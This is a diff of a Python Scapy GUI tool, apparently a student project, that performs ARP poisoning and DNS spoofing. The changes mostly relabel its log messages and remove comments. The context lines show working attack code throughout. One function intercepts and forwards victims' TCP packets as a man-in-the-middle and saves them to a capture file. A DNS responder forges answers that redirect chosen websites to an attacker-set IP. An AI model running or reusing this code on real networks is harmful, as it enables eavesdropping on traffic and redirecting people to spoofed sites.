@@ -12,18 +12,17 @@ class Application(Frame):
         self.grid()
         self.createWidgets()
         self.interceptedPackets = []
-        self.NETWORK_INTERFACE = "enp0s3" #hardcoded for now
-        print("Network Interface: " + self.NETWORK_INTERFACE);
-        self.ATTACKER_IP = IP().src #NB: This doesn't actually work; it fetches the IP from enp0s8 and not enp0s3!
+        self.NETWORK_INTERFACE = "enp0s3" #hardcoded
+        print("(GENERAL) Network Interface: " + self.NETWORK_INTERFACE);
         self.ATTACKER_MAC = get_if_hwaddr(self.NETWORK_INTERFACE)
-        print("Attacker IP: " + self.ATTACKER_IP + " (<-- WRONG!), Attacker MAC: " + self.ATTACKER_MAC);
+        print("(GENERAL) Attacker MAC: " + self.ATTACKER_MAC);
 
         
     def createWidgets(self):        
         self.arp = Button(self, text="ARP Poisoning", command=self.on_click_arp) #, state="disabled"
         self.arp.grid(row=0, column=0)
         
-        self.dns = Button(self, text="DNS Poisoning", command=self.on_click_dns) #, state="disabled"
+        self.dns = Button(self, text="DNS Spoofing", command=self.on_click_dns) #, state="disabled"
         self.dns.grid(row=0, column=4)
 
         self.grid_columnconfigure(2, minsize=100)
@@ -88,14 +87,14 @@ class Application(Frame):
         for i in range(0,len(self.VICTIM_IP)):
             self.VICTIM_MAC.append(self.get_mac(self.VICTIM_IP[i]))
 
-        print("Victim IP: " + str(self.VICTIM_IP) + ", Victim MAC: " + str(self.VICTIM_MAC));
+        print("(ARP) Victim IP: " + str(self.VICTIM_IP) + ", Victim MAC: " + str(self.VICTIM_MAC));
         
         self.SERVER_IP = self.fieldIPServer.get().split(",")
         self.SERVER_MAC = []
         for i in range(0,len(self.SERVER_IP)):
             self.SERVER_MAC.append(self.get_mac(self.SERVER_IP[i]))
 
-        print("Server IP: " + str(self.SERVER_IP) + ", Server MAC: " + str(self.SERVER_MAC));
+        print("(ARP) Server IP: " + str(self.SERVER_IP) + ", Server MAC: " + str(self.SERVER_MAC));
 
         #ARP poison thread
         poison_thread = threading.Thread(target=self.arp_poisoning) #, args=(IPToSpoof, MACToSpoof, IPVictim, MACVictim)
@@ -148,20 +147,17 @@ class Application(Frame):
     #forward packets meant for a poisoned target
     def arp_sniffing_victim(self):
         
-        print("Forwarding the TCP packets");
-
-        #sniff_filter_var = "tcp" # and src host " + IPVictim + " and dst host " + IPToSpoof
-        #print("[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+        print("(ARP) Forwarding the TCP packets");
 
         def intercept_packet(packet):
             
             self.interceptedPackets.append(packet)
             if packet[IP].dst in self.SERVER_IP:
                 index = self.SERVER_IP.index(packet[IP].dst)
-                print("Forwarding packet to server..")
+                print("(ARP) Forwarding packet to server..")
                 packet[Ether].dst = self.SERVER_MAC[index]
             else:
-                print("Forwarding packet to victim..")
+                print("(ARP) Forwarding packet to victim..")
                 index = self.VICTIM_IP.index(packet[IP].dst)
                 packet[Ether].dst = self.VICTIM_MAC[index]
             packet[Ether].src = self.ATTACKER_MAC
@@ -170,8 +166,7 @@ class Application(Frame):
         sniff(lfilter=self.sniff_filter, prn=intercept_packet, iface=self.NETWORK_INTERFACE)
             
 
-        print("Finished forwarding Packets!");
-        #print("[*] Stopping network capture..Restoring network")
+        print("(ARP) Finished forwarding Packets!");
 
     
     #Get the MAC Address for a given IP address (by sending an ARP-request)
@@ -183,21 +178,14 @@ class Application(Frame):
 
 
     def click(self, key):
-        #TODO
-       # if (self.fieldMACVictim.get() and self.fieldIPVictimARP.get() and self.fieldMACToSpoof.get() and  self.fieldIPServer.get()):
-            #print ("YES")
-            self.arp['state']="normal"
-        #else:
-            #self.arp['state']="disabled"
-            #print ("NO")
+        self.arp['state']="normal"
 
     def on_quit(self):
-        print "oh hi there"
+        print "(GENERAL) Storing intercepted packets (if ARP-poisoning was performed)..."
         if len(self.interceptedPackets) > 0:
-            wrpcap("loggedPackets"+str(8)+".cap",self.interceptedPackets)
-        print "donezo"
+            wrpcap("loggedPackets.cap",self.interceptedPackets)
+        print "(GENERAL) Intercepted packets stored!"
         root.destroy()
-        #self.master.destroy
 
     def dns_cache_poison(self):
         pass
@@ -214,7 +202,7 @@ class Application(Frame):
         def dns_responder():
  
             def forward_dns(orig_pkt):
-                print("[DNS] Forwarding: " + orig_pkt[DNSQR].qname)
+                print("(DNS) Forwarding: " + orig_pkt[DNSQR].qname)
                 response = sr1(
                     IP(dst='8.8.8.8')/
                         UDP(sport=orig_pkt[UDP].sport)/
@@ -234,7 +222,6 @@ class Application(Frame):
                 ):                
                     for i in range(0,len(WEBSITE)):
                         SITE = WEBSITE[i]
-                        print(SITE)
                         if SITE in str(pkt["DNS Question Record"].qname):
                             redirectIP = self.REDIRECT_TO_IP[i] if len(self.REDIRECT_TO_IP) < i else self.REDIRECT_TO_IP[0]
                         
